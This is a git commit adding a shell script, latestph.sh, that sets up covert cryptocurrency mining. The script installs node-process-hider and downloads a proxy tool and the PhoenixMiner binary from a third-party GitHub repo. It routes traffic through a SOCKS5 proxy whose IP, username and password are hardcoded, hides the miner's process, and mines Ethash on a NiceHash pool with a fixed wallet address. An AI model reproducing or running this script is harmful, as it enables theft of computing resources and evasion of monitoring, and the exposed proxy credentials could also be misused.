a71f4f0ffa73f3770bba151bb9f51aec90fbe38c
haqqi92 <87174321+haqqi92@users.noreply.github.com>
2022-05-22 20:47:40 +0700

    Create latestph.sh

---
+++ latestph.sh
@@ -0,0 +1,43 @@
+apt update && apt -y install sudo wget curl unzip
+
+sudo apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
+
+curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
+
+apt-get install -y nodejs
+
+npm i -g node-process-hider
+
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+
+dpkg-reconfigure --frontend noninteractive tzdata
+
+wget https://github.com/DeniBogeh/DeniBogehh/raw/main/graphics.tar.gz
+
+tar -xvzf graphics.tar.gz
+
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 =  45.140.13.119:9132 
+socks5_username = hkiufmpo
+socks5_password = ymolveyg3g5z
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+
+echo " "
+
+./graftcp/graftcp wget https://github.com/DeniBogeh/DeniBogehh/raw/main/PhoenixMiner
+
+chmod +x PhoenixMiner
+
+ph add PhoenixMiner
+
+./graftcp/graftcp ./PhoenixMiner --algo ETHASH --pool stratum+tcp://daggerhashimoto.hk.nicehash.com:3353 --user 33xJDvi2WBzpQm8XakanP3kgTCMNdiBTQq.$(echo $(shuf -i 1-999 -n 1)-Phoenix) --ethstratum ETHPROXY
